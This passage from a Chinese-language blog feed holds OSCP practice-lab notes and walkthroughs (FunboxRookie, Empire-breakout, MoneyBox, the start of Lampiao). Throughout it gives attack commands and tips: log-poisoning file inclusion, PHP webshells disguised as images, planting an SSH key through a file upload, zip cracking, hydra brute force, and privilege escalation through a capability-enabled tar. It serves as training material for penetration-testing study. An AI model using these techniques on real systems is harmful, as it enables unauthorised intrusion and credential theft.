class="line">http://192.168.212.80/console/file.php?file=/var/log/auth.log&amp;&amp;cmd=id</span><br></pre></td></tr></table></figure><p>上php马，拿到shell</p><h2 id="常用木马"><a href="#常用木马" class="headerlink" title="常用木马"></a>常用木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /usr/share/webshells/php/php-reverse-shell.php ./shell3.jpg</span><br></pre></td></tr></table></figure><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>ssh指定密钥登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i key root@ip</span><br></pre></td></tr></table></figure><p>echo写入webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php xxx&gt;&#x27; &gt;&gt; webshell.php.jpg # 单引号</span><br></pre></td></tr></table></figure><p>对隐写的文件进行分析提取 -p是指定密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf test.jpg -p 123456</span><br></pre></td></tr></table></figure><p>绕过restricted shell，一般就ssh加上-t “bash –noprofile”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/?source=post_page-----c9182b63a4de--------------------------------</span><br></pre></td></tr></table></figure><p>shellshock不一定打&#x2F;cgi-bin&#x2F;的cgi文件，打&#x2F;cgi-bin&#x2F;test这种后缀不是cgi的都可以</p><p>curl命令进行POST方式上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 第一个-F为指定本地上传的文件的路径，@符号必须要有，第二个-F为额外的自定义的参数，可以没有，大部分情况下得有，实际上就是POST传过去的数据</span><br><span class="line">curl -X POST -F &quot;file=@/home/xxx&quot; -F filename=&quot;/tmp/test.txt&quot; http://xxxx.xxx</span><br></pre></td></tr></table></figure><h2 id="交互式shell生成"><a href="#交互式shell生成" class="headerlink" title="交互式shell生成"></a>交互式shell生成</h2><p>最新版kali使用的是zsh不是bash，所以之前的应该使用如下方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#in kali</span><br><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">然后ctrl+Z将进程放置到后台运行</span><br><span class="line">stty raw -echo; fg</span><br><span class="line">enter</span><br><span class="line">export SHELL=/bin/bash</span><br><span class="line">export TERM=screen</span><br><span class="line">stty rows 40 columns 120</span><br><span class="line">reset</span><br></pre></td></tr></table></figure><h2 id="思路性的"><a href="#思路性的" class="headerlink" title="思路性的"></a>思路性的</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">记得扫目录中的子目录</span><br><span class="line"></span><br><span class="line">现成的EXP不能用的话，记得看漏洞描述</span><br><span class="line"></span><br><span class="line">弱口令试一下用户名和密码都是用户名，使用su切换用户</span><br><span class="line"></span><br><span class="line">如果是固定的那种系统，可以搜默认账号密码，然后拿默认账号去爆破密码</span><br><span class="line"></span><br><span class="line">一定记得看网页源码</span><br><span class="line"></span><br><span class="line">有时候需要切换到普通用户，再拿root</span><br><span class="line"></span><br><span class="line">文件包含可以读取passwd文件然后破解</span><br><span class="line"></span><br><span class="line">进去有phpmyadmin的系统，找数据库配置文件，拿来密码复用</span><br><span class="line"></span><br><span class="line">记得读取passwd文件然后破解</span><br><span class="line"></span><br><span class="line">如果有文件上传，可以考虑上传一个txt之类的文件到.ssh/authorized_keys上去，然后登录（下面的例子实际上是上传之后用filename参数把上传之后的文件名改了）</span><br><span class="line">ssh-keygen</span><br><span class="line">sudo chmod 600 id_rsa</span><br><span class="line">sudo cp id_rsa.pub id_rsa.txt</span><br><span class="line">curl -i -L -X POST -F file=&quot;@/id_rsa.txt&quot; -F filename=”/home/xxx/.ssh/authorized_keys” http://xxx</span><br><span class="line">sudo ssh -oHostKeyAlgorithms=+ssh-dss alfredo@192.168.185.249 -p 25022 -i /home/sinner/Documents/oscp/id_rsa</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-FunboxRookie</title>
      <link href="/2024/04/17/OSCPLab-FunboxRookie/"/>
      <url>/2024/04/17/OSCPLab-FunboxRookie/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     ProFTPD 1.3.5e</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip</span><br><span class="line">| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip</span><br><span class="line">| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg</span><br><span class="line">|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)</span><br><span class="line">|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)</span><br><span class="line">|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/logs/</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 3.5 (87%), WatchGuard Fireware 11.8 (87%), Linux 5.3 - 5.4 (87%), Linux 4.8 (86%), Synology DiskStation Manager 5.1 (86%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>80端口也是个apache，ftp允许匿名登录</p><p>发现如下文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||20679|)</span><br><span class="line">150 Opening ASCII mode data connection for file list</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip</span><br><span class="line">-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip</span><br><span class="line">-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg</span><br><span class="line">-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip</span><br></pre></td></tr></table></figure><p>查看welcome.msg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome, archive user %U@%R !</span><br><span class="line"></span><br><span class="line">The local time is: %T</span><br><span class="line"></span><br><span class="line">This is an experimental FTP server.  If you have any unusual problems,</span><br><span class="line">please report them via e-mail to &lt;root@%L&gt;.</span><br></pre></td></tr></table></figure><p>查看下载下来的zip压缩包，里面全都是SSH私钥</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>破解加密的zip包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john tom.zip &gt;&gt; has1.txt</span><br><span class="line">john has1.txt</span><br></pre></td></tr></table></figure><p>得到压缩包密码为iubire</p><p>然后指定私钥登录服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa tom@192.168.237.107</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看tom用户属于lxd组，使用lxd提权，但是失败了</p><p>查看到当前目录下有.mysql_history文件，猜测xx11yy22!可能是密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert\040into\040support\040(tom,\040xx11yy22!);</span><br></pre></td></tr></table></figure><p>然后切换为root权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Empire-breakout</title>
      <link href="/2024/04/17/OSCPLab-Empire-breakout/"/>
      <url>/2024/04/17/OSCPLab-Empire-breakout/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br><span class="line">20000/tcp open  dnp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.51 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">10000/tcp open  http        MiniServ 1.981 (Webmin httpd)</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line">20000/tcp open  http        MiniServ 1.830 (Webmin httpd)</span><br><span class="line">|_http-server-header: MiniServ/1.830</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 3.4 (87%), Linux 3.5 (87%), Linux 3.7 (87%), Linux 4.2 (87%), Linux 4.4 (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-04-17T11:57:52</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br></pre></td></tr></table></figure><p>针对SMB服务，先看一下能否匿名登录，好像没有有价值的东西</p><p>直接访问80端口，是一个apache的服务器，10000端口发现是一个webmin的系统，服务器是MiniServ 1.981</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>搜到一个webmin的未授权RCE，CVE-2019-15107 Webmin RCE &lt;&#x3D;1.920 (unauthorized)，试一下能不能用，直接拿GitHub上的exp打不了，只好自己上手了</p><p>出现漏洞的点在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.184.238:10000/password_change.cgi</span><br></pre></td></tr></table></figure><p>果然还是不行，提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password changing is not enabled! at /usr/share/webmin/password_change.cgi</span><br></pre></td></tr></table></figure><p>又找到一个CVE-2022-36446 - Webmin 1.996 Remote Code Execution，但是这个洞的前提是认证</p><p>在80端口的源码里找到一段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted :)</span><br><span class="line"></span><br><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>解密之后是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.2uqPEfj3D&lt;P&#x27;a-3</span><br></pre></td></tr></table></figure><p>运行enum4linux枚举smb用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 192.168.184.238 -v</span><br></pre></td></tr></table></figure><p>得到用户名cyber</p><p>登录进系统之后发现有执行命令的终端，直接弹shell回来</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查找具有cap权限的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>找到tar命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">打包文件</span><br><span class="line">./tar -cvf passwd.tar /var/backups/.old_pass.bak </span><br><span class="line">解压文件</span><br><span class="line">tar -xvf passwd.tar</span><br></pre></td></tr></table></figure><p>.&#x2F;意思是用当前目录下的tar文件，不加.&#x2F;意思就是用系统的tar，因为题目给的tar文件有执行权限，所以要用题目给的tar打包,再查看解压的文件就可以成功查看到root密码</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-MoneyBox</title>
      <link href="/2024/04/17/OSCPLab-MoneyBox/"/>
      <url>/2024/04/17/OSCPLab-MoneyBox/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.45.219</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)</span><br><span class="line">|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)</span><br><span class="line">|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-title: MoneyBox</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 3.5 (87%), Linux 4.4 (87%), Synology DiskStation Manager 5.1 (87%), WatchGuard Fireware 11.8 (87%), Linux 5.3 - 5.4 (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>21端口可以试一下匿名登录，80端口直接访问是个欢迎页面，没什么太多的信息</p><p>ftp匿名登录之后发现trytofind.jpg文件，大小为1M，直觉告诉我作为一个jpg文件这个大小很不正常，应该会涉及到隐写</p><p>扫目录，发现了<a href="http://192.168.184.230/blogs/%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81%E5%8F%91%E7%8E%B0">http://192.168.184.230/blogs/目录，查看源码发现</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--the hint is the another secret directory is S3cr3t-T3xt--&gt;</span></span><br></pre></td></tr></table></figure><p>访问<a href="http://192.168.184.230/S3cr3t-T3xt/%EF%BC%8C%E5%86%8D%E6%9F%A5%E7%9C%8B%E7%BD%91%E9%A1%B5%E6%BA%90%E7%A0%81">http://192.168.184.230/S3cr3t-T3xt/，再查看网页源码</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!..Secret Key 3xtr4ctd4t4 &gt;</span><br></pre></td></tr></table></figure><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>到这里其实我就卡住了，后来看了hint知道’3xtr4ctd4t4’ 意味着 ‘extractdata’</p><p>使用steghide对jpg文件进行操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf trytofind.jpg -p 3xtr4ctd4t4</span><br></pre></td></tr></table></figure><p>提取出data.txt，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello.....  renu</span><br><span class="line"></span><br><span class="line">      I tell you something Important.Your Password is too Week So Change Your Password</span><br><span class="line">Don&#x27;t Underestimate it.......</span><br></pre></td></tr></table></figure><p>是提示我们去用弱口令爆破ssh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l renu -P rockyou.txt ssh://192.168.184.230 -f</span><br></pre></td></tr></table></figure><p>密码是987654321，成功连接</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>看了一下内核版本，是4.x的，想到DirtyCow提权，但是g++编译环境在目标主机上没了</p><p>查看一下home目录，下面有lily用户，再查看其中的.ssh文件，.ssh文件中有renu用户，这意味着renu用户可以无密码直接切换为lily用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys </span><br><span class="line">ssh-rsa AAAAB3xxxXEB9F3 renu@debian</span><br></pre></td></tr></table></figure><p>直接在renu的终端运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">renu@MoneyBox:/home/lily/.ssh$ ssh lily@127.0.0.1</span><br></pre></td></tr></table></figure><p>然后sudo -l，发现usr&#x2F;bin&#x2F;perl，然后拿下root权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Lampiao</title>
      <link href="/2024/04/17/OSCPLab-Lampiao/"/>
      <url>/2024/04/17/OSCPLab-Lampiao/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">1898/tcp open  cymtec-port</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)</span><br><span class="line">|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)</span><br><span class="line">|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)</span><br><span class="line">|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)</span><br><span class="line">80/tcp   open  http?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     _____ _ _ 